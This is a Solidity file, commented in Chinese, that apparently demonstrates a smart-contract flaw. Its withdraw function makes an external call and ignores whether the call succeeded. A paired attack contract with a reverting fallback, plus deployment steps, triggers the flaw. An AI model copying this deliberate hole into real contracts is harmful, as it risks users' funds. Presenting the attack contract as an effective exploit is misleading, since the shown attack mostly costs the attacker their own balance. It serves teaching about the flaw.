// SPDX-License-Identifier: UNLICENSED
// Vulnerable Contract Demonstrating Improper Check of External Call Result
// 此合約存在漏洞：在 withdraw 函式中，呼叫外部合約 (msg.sender.call) 時沒有正確檢查回傳結果，
// 這可能讓惡意用戶透過設計失敗的 fallback 函式來造成不可預期的行為。

pragma solidity >=0.8.0;

contract VulnerableContract {
    // 狀態變數：記錄每個地址存入的 Ether 數量
    mapping(address => uint256) public balances;

    // 存款函式，接收 Ether 並更新餘額
    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    // 漏洞函式 withdraw：在進行外部呼叫時沒有正確檢查執行結果
    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        // 更新狀態變數，扣除提領金額
        balances[msg.sender] -= amount;
        
        // 進行外部呼叫：嘗試將 Ether 傳送給呼叫者
        // 漏洞重點：此行沒有使用 require() 確認回傳結果 success
        (bool success, ) = msg.sender.call{value: amount}("");
        // 錯誤示範：沒有判斷 success，因此即使外部呼叫失敗，也不會反悔或中止後續邏輯
    }

    // 接收 Ether 的函式
    receive() external payable {}
}

// 攻擊合約：利用 VulnerableContract 中 withdraw 函式缺少檢查回傳資料的漏洞
// 部署步驟：
// 1. 部署 VulnerableContract。
// 2. 部署 AttackContract 並傳入 VulnerableContract 的地址 (address payable 型別)。
// 3. 透過 AttackContract 呼叫 deposit() 存入一些 Ether。
// 4. 透過 AttackContract 呼叫 attackWithdraw() 提領 Ether，觸發 VulnerableContract 的 withdraw 函式。

contract AttackContract {
    VulnerableContract public vulnerable;

    // 修改建構子參數型別為 address payable 以符合轉換需求
    constructor(address payable _vulnerable) {
        vulnerable = VulnerableContract(_vulnerable);
    }

    // 攻擊合約的 fallback 函式，意圖在接收 Ether 時強制 revert，模擬外部呼叫失敗
    fallback() external payable {
        revert("AttackContract: Fallback revert");
    }

    // （可選）若需要也可以實作 receive 函式，但此處保留攻擊邏輯
    // receive() external payable { revert("AttackContract: Receive revert"); }

    // 存款到 VulnerableContract
    function deposit() external payable {
        vulnerable.deposit{value: msg.value}();
    }

    // 發起提領，觸發 VulnerableContract 的 withdraw 函式
    function attackWithdraw(uint256 amount) external {
        vulnerable.withdraw(amount);
    }

    // 查詢合約餘額，用於測試
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
